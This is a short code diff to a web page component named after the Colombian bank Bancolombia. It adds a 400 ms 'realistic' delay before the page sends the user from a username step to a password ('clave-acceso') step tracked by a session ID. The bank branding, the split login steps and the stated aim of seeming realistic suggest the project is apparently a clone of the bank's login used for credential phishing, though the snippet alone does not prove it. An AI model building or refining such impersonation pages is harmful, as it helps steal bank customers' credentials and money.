@@ -52,6 +52,8 @@ export default function BancolombiaUsuarioPage() {
       });
 
       if (response.ok) {
+        // Delay realista antes de navegar
+        await new Promise(resolve => setTimeout(resolve, 400));
         router.push(`/bancolombia/clave-acceso?sessionId=${sessionId}`);
       }
     } catch (error) {
